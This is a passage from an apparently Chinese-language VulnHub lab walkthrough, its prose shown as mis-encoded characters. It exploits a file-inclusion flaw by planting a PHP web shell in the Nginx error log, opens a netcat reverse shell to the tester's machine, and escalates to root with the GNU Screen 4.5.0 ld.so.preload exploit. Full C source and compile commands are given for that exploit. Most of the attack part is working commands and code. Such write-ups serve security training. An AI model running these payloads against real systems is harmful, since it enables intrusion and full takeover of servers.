alt="image-20220930190329914"></p><p>æŒ¨ä¸ªè®¿é—®ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨æˆ–è€…äº¤äº’çš„åœ°æ–¹</p><p><img src="/2022/08/29/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p><p><img src="/2022/08/29/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p><p>å‘ç°<code>Concat</code>çª—å£ä¸‹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œå¯ä»¥å®ç°äº¤äº’æ•ˆæœï¼Œæˆ‘ä»¬ä¹±è¾“å…¥ä¸€äº›æ•°æ®å…ˆè¯•è¯•</p><p>çœ‹çœ‹å˜åŒ–</p><p><img src="/2022/08/29/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p><p>å‘ç°<code>url</code>åœ¨æäº¤æ—¶å‘ç”Ÿçš„è·³è½¬ï¼Œå¹¶ä¸”æ˜¾ç¤ºäº†ä¸€äº›ä¿¡æ¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure><p>çœ‹å¾—å‡ºæ¥ï¼Œç½‘ç«™è·³è½¬åˆ°äº†<code>thankyou.php</code>ï¼Œè€Œä¸”æˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ä¹Ÿè¢«ä»¥æ˜æ–‡æ–¹å¼æ˜¾ç¤ºå‡ºæ¥äº†</p><p>é‚£æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æƒ³èµ·ä¹‹å‰ä½œè€…ç»™çš„æç¤ºï¼Œè¯´<strong>åˆ·æ–°çš„æ—¶å€™ä¼šå‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ‘ä»¬åˆ·æ–°çœ‹çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p><p><img src="/2022/08/29/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p><p>å¯¹æ¯”ä¸¤ä¸ªå›¾å¯ä»¥å‘ç°ï¼Œåº•ä¸‹çš„å¹´ä»½æ—¶é—´å‘ç”Ÿäº†æ”¹å˜ï¼Œ<strong>åˆ·æ–°ä¸€æ¬¡ï¼Œå¢åŠ ä¸€å¹´</strong></p><p>è¿™ä¸ªè‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯ä¸çŸ¥é“</p><p>æˆ‘ä»¬å…ˆè¦äº†è§£è¿™ä¸ªå˜åŒ–è‚¯å®šæ˜¯æœ‰æ–‡ä»¶æ¥è°ƒç”¨çš„ï¼Œè€Œæˆ‘ä»¬è‚¯å®šæ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å†æ¬¡é’ˆå¯¹æ€§çš„è¿›è¡Œä¿¡æ¯æ”¶é›†</p><p>ç”¨ç»å…¸çš„<code>dirsearch</code>æ¥æ‰«ä¸€ä¸‹</p><p><img src="/2022/08/29/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p><p>é™¤å»æˆ‘ä»¬å·²ç»è®¿é—®è¿‡çš„æ–‡ä»¶å’Œå“åº”ç 403çš„ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš<code>footer.php</code>æ–‡ä»¶ï¼Œåˆšå¥½å’Œæˆ‘ä»¬çš„å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ä¸€è‡´ï¼Œä¹Ÿæ˜¯<code>åº•éƒ¨æ–‡æœ¬</code>å˜åŒ–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/footer.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p><p>å‘ç°æœç„¶æ˜¯æˆ‘ä»¬å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ï¼Œè€Œä¸”æˆ‘ä»¬åˆ·æ–°æ—¶ï¼Œä¹Ÿä¼šåŒæ—¶å˜åŒ–</p><hr><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ‰€ä»¥æŒ‰ä¸Šé¢æˆ‘ä»¬æ¨åˆ°çš„æ€è·¯ï¼Œå’Œä¿¡æ¯çš„æ”¶é›†ï¼Œ</p><p><code>concat.php</code>çš„åº•éƒ¨ä¸ºäº†æ˜¾ç¤ºå’Œ<code>footer.php</code>çš„å®ç°åŠŸèƒ½ï¼Œè‚¯å®šæ˜¯å®ç°äº†æ–‡ä»¶åŒ…å«ï¼Œ</p><p><code>concat.php</code>æŠŠ<code>footer.php</code>æ–‡ä»¶åŒ…å«äº†</p><p>&#x3D;&#x3D;&gt;æˆ‘ä»¬æ¸—é€çš„åŸºç¡€æ€è·¯å°±å˜æˆäº†<strong>åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«   æ‹¿åˆ°shell</strong></p><h3 id="1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"><a href="#1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•" class="headerlink" title="1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"></a>1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</h3><p>ã€æ–‡ä»¶åŒ…å«æ³¨å…¥ç‚¹å¯æ§å‚æ•°åä¸€èˆ¬ä¸º<code>file</code>ï¼Œå½“ç„¶å¦‚æœå‡ºç°æ€ä¹ˆéƒ½ä¸è¡Œçš„ï¼Œé‚£å°±å¯ä»¥ç”¨<code>çˆ†ç ´</code>**(fuzz)**æˆ–è€…æˆ‘ä»¬çš„æ€è·¯é”™è¯¯äº†ã€‘</p><p>æˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½åŒ…å«<code>index.php</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p><p>å‘ç°<code>index.php</code>ç¡®å®è¢«æˆ‘ä»¬æˆåŠŸåŒ…å«äº†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è‚¯å®šæˆ‘ä»¬çš„æ€è·¯æ˜¯æ²¡æœ‰åç¦»äº†</p><h3 id="2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"><a href="#2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell" class="headerlink" title="2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"></a>2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</h3><p>æ—¢ç„¶èƒ½å¤Ÿåœ¨<code>thank.php</code>é‡Œå®ç°æ–‡ä»¶åŒ…å«ï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•èƒ½ä¸èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¥è·å–æ›´å¤šä¿¡æ¯</p><h4 id="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"><a href="#1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ" class="headerlink" title="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"></a>1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</h4><p>æ ¹æ®æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„ä¿¡æ¯ï¼Œ</p><p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p><p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p><blockquote><p>Nginxè®¿é—®æ—¥å¿—ï¼šç½‘ç«™è®¿é—®è€…æœ‰å…³çš„æ´»åŠ¨éƒ½è®°å½•åœ¨è®¿é—®æ—¥å¿— &#x2F;&#x2F;<code>access_log</code></p><p>Nginxé”™è¯¯æ—¥å¿—ï¼šå½“è®¿é—®é”™è¯¯çš„æ—¶å€™ï¼Œä¼šæŠŠé”™è¯¯å‚æ•°ä¿å­˜åœ¨å…¶ä¸­  &#x2F;&#x2F;<code>error_log</code></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„</p><blockquote><p><code>url/?file=</code> çš„åé¢åŠ ä¸Šä¸€å¥è¯ğŸï¼Œ<br>ç„¶åå› ä¸ºè®¿é—®é”™è¯¯ï¼Œé”™è¯¯å‚æ•°ã€ä¸€å¥è¯ğŸã€‘å°±ä¼šåˆ°<code>nginxçš„é”™è¯¯æ—¥å¿—</code>ä¸­ï¼Œ<br>ç„¶ååˆ©ç”¨æˆ‘ä»¬å‘ç°çš„æ–‡ä»¶åŒ…å«æŠŠé”™è¯¯æ—¥è®°åŒ…å«åœ¨<code>thankyou.php</code>æ–‡ä»¶ä¸­ï¼Œ<br>è®¿é—®æ‹¿åˆ°<code>shell</code>ï¼Œæ‹¿åˆ°<code>shell</code></p></blockquote><p><em><code>nginx</code>é…ç½®æ–‡ä»¶ä½ç½®ï¼š</em><em>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</em>*</p><p>æˆ‘ä»¬åŒ…å«è¯¥æ–‡ä»¶çœ‹çœ‹<strong>nginxçš„é”™è¯¯æ—¥å¿—æ–‡ä»¶</strong>ä½ç½®åœ¨å“ªé‡Œ</p><p><img src="/2022/08/29/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p><p>çœ‹åˆ°æ–‡ä»¶ä½ç½®</p><blockquote><p><code>error_logï¼š/var/log/nginx/error.log</code></p></blockquote><p>å…ˆè¾“å…¥ä¸€å¥è¯ğŸï¼ŒæŠ¥é”™å¯¼å…¥<code>nginx</code>é”™è¯¯æ—¥å¿—</p><hr><p><strong>key</strong>ï¼šå¦‚æœç›´æ¥åœ¨ç½‘é¡µè¾“å…¥ä¸€å¥è¯ğŸå¯¼å…¥é”™è¯¯æ—¥å¿—æ˜¯æœ‰é—®é¢˜çš„</p><blockquote><p>å½“æˆ‘ä»¬è®¿é—®<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p><p>è™½ç„¶ç¡®å®æŠŠè¿™ä¸ªä¿¡æ¯å¯¼å…¥åˆ°äº† <code>/var/log/nginx/error.log</code> æ–‡ä»¶é‡Œ</p><p>ä½†æ˜¯å‰ç«¯ä¼¼ä¹å­˜åœ¨è¿‡æ»¤ï¼Œä¼šæŠŠ&lt;&gt;å’Œâ€™â€™æˆ–â€â€ï¼Œæ›¿æ¢æˆå…¶ä»–ç¬¦å·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æƒ³è¦åˆ©ç”¨</p><p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p><p>è¿™æ ·æƒ³åˆ©ç”¨æˆ‘ä»¬å¯¼å…¥çš„æœ¨é©¬æ‹¿åˆ°shellçš„æ—¶å€™ï¼Œå®é™…ä¸Šæˆ‘ä»¬çš„æœ¨é©¬å·²ç»è¢«ç ´åäº†ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä¸€ç³»åˆ—å‘½ä»¤ï¼Œæ‰€ä»¥ç”¨æŠ“åŒ…burpç›´æ¥å‘é€åˆ°æœåŠ¡å™¨ï¼Œç»•è¿‡å‰ç«¯è¿‡æ»¤å…ˆï¼Œè¿™æ ·æˆ‘ä»¬çš„ä¸€å¥è¯ğŸæ‰èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨</p></blockquote><hr><p>æ‰€ä»¥æˆ‘ä»¬æ‰§è¡Œ<strong>æŠ“åŒ…æ“ä½œ</strong></p><p><img src="/2022/08/29/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></p><p>æ²¡æœ‰å…¶ä»–å›æ˜¾å†…å®¹</p><p><img src="/2022/08/29/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></p><p>æˆ‘ä»¬åœ¨æ–‡ä»¶åŒ…å«<code>/var/log/nginx/error.log</code>ï¼Œå¹¶åˆ©ç”¨<code>cmd</code>å‚æ•°æ‰§è¡Œ<code>ls</code>è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦çœŸçš„æŠŠæˆ‘ä»¬çš„æœ¨é©¬åŒ…å«è¿›å»äº†</p><p><img src="/2022/08/29/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></p><p>å‘ç°ç¡®å®æˆåŠŸåŒ…å«è¿›å»äº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p>é‚£æˆ‘ä»¬ç›´æ¥ç”¨<code>nc</code>å‘½ä»¤åå¼¹<code>shell</code></p><h4 id="2ï¼‰ncå‘½ä»¤åå¼¹shell"><a href="#2ï¼‰ncå‘½ä»¤åå¼¹shell" class="headerlink" title="2ï¼‰ncå‘½ä»¤åå¼¹shell"></a>2ï¼‰ncå‘½ä»¤åå¼¹shell</h4><p>å…ˆåœ¨<code>kali</code>æ§åˆ¶å°æ‰§è¡Œ<code>nc</code>ç›‘å¬<code>8888</code>ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></p><p>ç„¶åç½‘é¡µæµè§ˆ</p><blockquote><p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p><p>&#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></p><p>è¿”å›æ§åˆ¶å°æŸ¥çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></p><p>è¿›å…¥<code>shell</code></p><p>ç„¶åæ ‡å‡†å§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></p><h4 id="è·å¾—ç¨³å®šçš„shell"><a href="#è·å¾—ç¨³å®šçš„shell" class="headerlink" title="*è·å¾—ç¨³å®šçš„shell"></a>*è·å¾—ç¨³å®šçš„shell</h4><p>ã€ä¸ä¼šå› ä¸ºctrl+cé€€å‡ºï¼Œè€Œä¸”å¯ä»¥æŒ‰ä¸Šä¸‹é”®ï¼Œè¿”å›ä¹‹å‰çš„å‘½ä»¤ã€‘</p><blockquote><p>å…ˆåœ¨shellï¼Œç”¨<code>Ctrl-Z</code>å°†shellæ”¾åˆ°åå°</p><p>å†<br><code>stty raw -echo ; fg ; reset</code>  </p><p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;è¿™ä¸ªä¸ç”¨è¾“å…¥ï¼Œæ˜¯è‡ªåŠ¨æ‰§è¡Œåå°çš„å‘½ä»¤è¿”å›åˆ°å‰å°</p><p>&#x2F;&#x2F;stty è®¾ç½®ç»ˆç«¯ç«¯å£è®¾å¤‡çš„æ¥å£é€‰é¡¹</p><p>&#x2F;&#x2F;echo è¡¨ç¤ºå›æ˜¾ï¼Œæ¯”å¦‚å½“-echoæ—¶ï¼Œè¾“å…¥lsåæŒ‰å›è½¦ï¼Œä»ç„¶ä¼šçœ‹åˆ°ls</p><p>&#x2F;&#x2F;fgæŠŠshellæåˆ°å‰å°æ¥</p><p>&#x2F;&#x2F;resetè¡¨ç¤ºé‡å¯ç»ˆç«¯ï¼Œæ­¤æ—¶çš„ç»ˆç«¯ä¸ºæˆ‘ä»¬é¶æœºçš„shellçª—å£ï¼Œæ‰€ä»¥ä¸å®¹æ˜“è¢«é€€å‡ºæˆ–è€…ä¸­æ–­</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></p><p>æˆåŠŸè·å¾—å…¨äº¤äº’å¼<code>shell</code></p><h3 id="3-ææƒ"><a href="#3-ææƒ" class="headerlink" title="3.ææƒ"></a>3.ææƒ</h3><p>æ‹¿åˆ°shellä»¥åï¼Œæˆ‘ä»¬æƒé™æ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<strong>å‚ç›´ææƒ</strong>ï¼Œæ‹¿åˆ°æœ€é«˜æƒé™</p><p>å…ˆçœ‹çœ‹å­˜ä¸å­˜åœ¨<code>suid</code>æ–¹å¼ææƒ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></p><p>ä¼¼ä¹æ²¡å•¥å¯ä»¥åˆ©ç”¨ææƒçš„ç‚¹ï¼Œä½†æ˜¯æœ‰ä¸ª</p><p><img src="/2022/08/29/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥æœ‰ç‚¹é™Œç”Ÿï¼Œæˆ‘ä»¬<code>ç™¾åº¦/google</code>å°±è¦åˆ©ç”¨èµ·æ¥äº†</p><blockquote><p><code>GNU Screen</code>æ˜¯ä¸€æ¬¾ç”±<code>GNU</code>è®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚</p><p><code>GNU Screen</code>å¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚</p><p>å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</p></blockquote><p>çœ‹æ¥æ˜¯å±äºsuidå½“ä¸­çš„æ¼æ´è„šæœ¬ææƒï¼Œé‚£è„šæœ¬æ€ä¹ˆæ‰¾å‘¢</p><h4 id="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"><a href="#1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶" class="headerlink" title="1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶"></a>1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>searchsploit</code>æœç´¢è½¯ä»¶ç›¸å…³æ¼æ´æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„è„šæœ¬ï¼Œè€Œä¸”å®ƒçš„ç‰ˆæœ¬å·ä¹Ÿå†™å‡ºæ¥äº†</p><p><img src="/2022/08/29/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></p><p>å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>shè„šæœ¬</code>æ–‡ä»¶ï¼Œä¸€ä¸ª<code>txtæ–‡æœ¬</code>çš„ï¼ˆPOCï¼‰</p><p>çœ‹åˆ°æœ‰<code>shè„šæœ¬</code>æ–‡ä»¶è·¯å¾„ï¼Œå…ˆæŸ¥çœ‹å…¶å†…å®¹æ˜¯ä»€ä¹ˆï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨</p><p><img src="/2022/08/29/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></p><p>å‘ç°æ˜¯ä¸ª<code>cè¯­è¨€è„šæœ¬</code></p><p><img src="/2022/08/29/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></p><p>çœ‹æ¥æˆ‘ä»¬æ‰¾çš„æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹è¯¥è„šæœ¬æ–‡ä»¶ï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨å…¶æ¥ææƒ</p><blockquote><p>ä»”ç»†çœ‹å…¶å®è¿™é‡Œé¢æœ‰ä¸¤ä¸ªCè¯­è¨€è„šæœ¬</p><p>ã€<code>EOF</code>ä¸ºæ–‡ç»“æŸç¬¦å·ã€‘</p><p>è€Œä¸”éœ€è¦ä¿å­˜åˆ°ä¸¤ä¸ªcæ–‡ä»¶ä¸­å»<br><code>libhax.c</code><br><code>rootshell.c</code></p><p>ç„¶åç”¨gccå‘½ä»¤<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p><p>å¯¹ä¸¤ä¸ªcæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œä»è€Œç”Ÿæˆ<br><code>libhax.so</code><br><code>rootshell</code></p><p>ç„¶ååœ¨æŠŠä¸¤ä¸ªcæ–‡ä»¶å’Œä¸¤ä¸ªç¼–è¯‘åç”Ÿæˆçš„æ–‡ä»¶ä¼ å…¥é¶æœºå</p><p>åœ¨é¶æœºshellæŒ¨ä¸ªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œä»è€Œæ‹¿åˆ°rootæƒé™</p><p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p></blockquote><p>ä¸ŠåŠéƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></p><p>ä¸‹åŠéƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></p><p><strong>&#x3D;&#x3D;&gt;</strong></p><p>æˆ‘ä»¬éœ€è¦åœ¨é¶æœºçš„&#x2F;tmpç›®å½•ä¸‹ï¼Œä¼ å…¥</p><blockquote><p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;å†…å®¹ä¸ºåé¢çš„å‘½ä»¤å†…å®¹</p></blockquote><p>è¿™ä¸‰ä¸ªæ–‡ä»¶</p><p>æˆ‘ä»¬å…ˆåœ¨è‡ªå·±çš„<code>kali</code>æœºä¸ŠæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶å‡†å¤‡å¥½</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆåˆ°æˆ‘ä»¬<code>kali</code>æœºçš„<code>/tmp</code>ç›®å½•ä¸‹</p><p>å…ˆæ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></p><p>å†æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure><p><img 